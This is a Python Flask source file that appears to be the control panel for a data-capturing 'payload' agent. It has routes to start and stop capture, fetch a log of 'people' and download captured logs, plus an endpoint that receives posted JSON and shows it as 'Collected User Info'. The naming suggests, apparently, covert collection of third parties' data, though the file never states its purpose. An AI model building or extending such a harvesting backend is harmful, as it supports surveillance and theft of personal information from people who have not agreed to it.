from flask import Flask, render_template_string, request, jsonify
from flask import render_template
import requests
import os
import json
from datetime import datetime


app = Flask(__name__)
PAYLOAD_API = "http://127.0.0.1:5000"  # Agent’s port
LOG_DIR = "userinfo_logs"
os.makedirs(LOG_DIR, exist_ok=True)
last_position = 0
latest_display_log = ""


# --- HTML Templates ---
CONTROL_PANEL_HTML = """

"""



USERINFO_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>User Info Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
        table { border-collapse: collapse; width: 100%; background: #fff; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        th { background: #333; color: #fff; }
        h2 { margin-bottom: 20px; }
    </style>
</head>
<body>
    <h2>Collected User Info</h2>
    <table>
        <tr>
            {% for key in data[0].keys() %}
                <th>{{ key }}</th>
            {% endfor %}
        </tr>
        {% for entry in data %}
        <tr>
            {% for value in entry.values() %}
                <td>{{ value }}</td>
            {% endfor %}
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# === Agent Control Routes ===
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    try:
        r = requests.post(f"{PAYLOAD_API}/start", timeout=3)
        return '', r.status_code
    except Exception as e:
        print(f"[ERROR] Failed to start capture: {e}")
        return str(e), 500

@app.route('/stop', methods=['POST'])
def stop():
    try:
        r = requests.post(f"{PAYLOAD_API}/stop", timeout=3)
        return '', r.status_code
    except Exception as e:
        print(f"[ERROR] Failed to stop capture: {e}")
        return str(e), 500

@app.route('/people')
def people():
    global last_position, latest_display_log
    try:
        r = requests.get(f"{PAYLOAD_API}/getpeople", timeout=3)
        new_log = r.text

        if new_log.strip():
            latest_display_log += new_log  # Append only if non-empty

        return latest_display_log, 200

    except Exception as e:
        return f"Error: {e}", 500

@app.route('/reload', methods=['POST'])
def reload():
    global last_position, latest_display_log
    try:
        r = requests.post(f"{PAYLOAD_API}/clear", timeout=3)
        if r.status_code == 200:
            last_position = 0
            latest_display_log = ""
        return '', r.status_code
    except Exception as e:
        return str(e), 500

@app.route('/download')
def download():
    try:
        r = requests.get(f"{PAYLOAD_API}/download", timeout=5, stream=True)
        return (r.content, r.status_code, {
            'Content-Disposition': r.headers.get('Content-Disposition', 'attachment'),
            'Content-Type': r.headers.get('Content-Type', 'application/octet-stream')
        })
    except Exception as e:
        print(f"[ERROR] Failed to download log: {e}")
        return str(e), 500

# === User Info Logging ===
@app.route('/userinfo', methods=['POST'])
def receive_userinfo():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No JSON received"}), 400

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"user_info_{timestamp}.json"
    filepath = os.path.join(LOG_DIR, filename)

    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"[✓] Info saved to {filepath}")
        return jsonify({"status": "success", "message": "Info received"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/userinfo')
def userinfo_dashboard():
    all_data = []
    for filename in sorted(os.listdir(LOG_DIR)):
        filepath = os.path.join(LOG_DIR, filename)
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
                all_data.append(data)
        except:
            continue

    if not all_data:
        return "<h2>No user info collected yet.</h2>"

    return render_template_string(USERINFO_HTML, data=all_data)

@app.route('/api/userinfo')
def get_userinfo_json():
    all_data = []
    for filename in sorted(os.listdir(LOG_DIR)):
        filepath = os.path.join(LOG_DIR, filename)
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
                all_data.append(data)
        except:
            continue

    return jsonify(all_data)


# === Entry Point ===
if __name__ == '__main__':
    

    app.run(debug=False, port=7000)
